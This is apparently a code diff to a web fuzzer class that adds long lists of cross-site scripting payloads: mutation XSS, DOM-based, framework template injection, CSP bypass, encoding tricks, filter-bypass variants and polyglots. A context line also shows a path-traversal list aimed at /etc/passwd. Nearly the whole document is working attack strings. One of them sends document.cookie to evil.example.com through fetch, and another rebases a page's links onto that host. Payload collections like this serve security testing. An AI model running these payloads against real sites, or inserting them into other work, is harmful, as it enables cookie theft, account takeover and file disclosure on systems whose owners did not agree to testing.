@@ -671,6 +671,105 @@ class SystematicFuzzer:
             "<div style=\"width:expression(alert(1))\">",
             "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
             "<base href=javascript:alert(1)///>",
+            # --- mXSS payloads ---
+            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+            '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
+            "<noscript><img src=x onerror=alert(1)></noscript>",
+            "<listing><img src=1 onerror=alert(1)>",
+            "<svg><style><img src=x onerror=alert(1)>",
+            # --- DOM-based ---
+            "#<img src=x onerror=alert(1)>",
+            '#"><svg/onload=alert(1)>',
+            "?default=<script>alert(1)</script>",
+            "?callback=alert",
+            "?redirect=javascript:alert(1)",
+            # --- Framework templates ---
+            "{{$eval.constructor('alert(1)')()}}",
+            "{{_c.constructor('alert(1)')()}}",
+            "{@html '<img src=x onerror=alert(1)>'}",
+            """<div v-html="'<img src=x onerror=alert(1)>'">""",
+            # --- CSP bypass ---
+            '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor(\'alert(1)\')()}}</div>',
+            '<base href="https://evil.example.com/">',
+            '<script nonce="">alert(1)</script>',
+            '<object data="data:text/html,<script>alert(1)</script>">',
+            '<script src="data:,alert(1)">',
+            # --- Uncommon tags+events ---
+            "<search onfocus=alert(1) autofocus tabindex=0>",
+            "<dialog open onclose=alert(1)>",
+            "<div onpointerrawupdate=alert(1)>",
+            "<div onbeforetoggle=alert(1)>",
+            "<div onsecuritypolicyviolation=alert(1)>",
+            "<div onscrollend=alert(1)>",
+            "<menu id=x><button onclick=alert(1)>",
+            "<slot onslotchange=alert(1)>",
+            "<svg><animate onbegin=alert(1)>",
+            # --- Protocol handlers ---
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+            '<iframe src="data:text/html,<script>alert(1)</script>">',
+            "<embed src=javascript:alert(1)>",
+            "<form><button formaction=javascript:alert(1)>X",
+            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
+            # --- Encoding variants ---
+            "%253Cscript%253Ealert(1)%253C/script%253E",
+            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+            "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+            # --- Stored XSS templates ---
+            "<img src=x onerror=alert(document.domain)>",
+            "<script>fetch('https://evil.example.com/'+document.cookie)</script>",
+            'filename="<img src=x onerror=alert(1)>.jpg"',
+            "![alt](javascript:alert(1))",
+            "[url]javascript:alert(1)[/url]",
+            # --- Polyglots ---
+            "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html onmouseover=/*<svg/*/onload=alert()//>",
+            "';alert(String.fromCharCode(88,83,83))//';alert(1)//\";alert(1)//--></SCRIPT>\">'><SCRIPT>alert(1)</SCRIPT>",
+            "<svg/onload=alert(1)//",
+            "';alert(1)//",
+        ],
+        "xss-filter-bypass": [
+            # Case variations
+            "<ScRiPt>alert(1)</ScRiPt>",
+            "<IMG SRC=JaVaScRiPt:alert(1)>",
+            "<SVG ONLOAD=alert(1)>",
+            # Null bytes
+            "<scri%00pt>alert(1)</script>",
+            "<img%00src=x%00onerror=alert(1)>",
+            # Tag fragmentation
+            "<scr<script>ipt>alert(1)</scr</script>ipt>",
+            "<<script>alert(1)//<</script>",
+            # Encoding chains
+            "%253Cscript%253Ealert(1)%253C/script%253E",
+            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+            # Comment tricks
+            "<!--><img src=x onerror=alert(1)>-->",
+            "<!--><svg onload=alert(1)-->",
+            # Backtick attributes
+            "<img src=`x` onerror=alert(1)>",
+            # Unicode fullwidth
+            "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
+            # Zero-width joiners
+            "<scr\u200cipt>alert(1)</script>",
+            # Control chars
+            "<img src=x onerror\x09=\x09alert(1)>",
+            "<a href=\x01javascript:alert(1)>",
+            # JS alternatives
+            "eval(atob('YWxlcnQoMSk='))",
+            "setTimeout('alert(1)')",
+            "setInterval('alert(1)',0)",
+            "Function('alert(1)')()",
+            "[].constructor.constructor('alert(1)')()",
+            "window['al'+'ert'](1)",
+            "self[atob('YWxlcnQ=')](1)",
+            # Alert alternatives
+            "confirm(1)", "prompt(1)", "print()",
+            # Homograph
+            "\ua731cript>alert(1)</script>",
+            # Scientific notation style / template literals
+            "<img src=x onerror=alert`1`>",
+            "<svg onload=alert&lpar;1&rpar;>",
+            "String.fromCharCode(97,108,101,114,116,40,49,41)",
         ],
         "lfi-payloads": [
             "../../../etc/passwd", "....//....//....//etc/passwd",
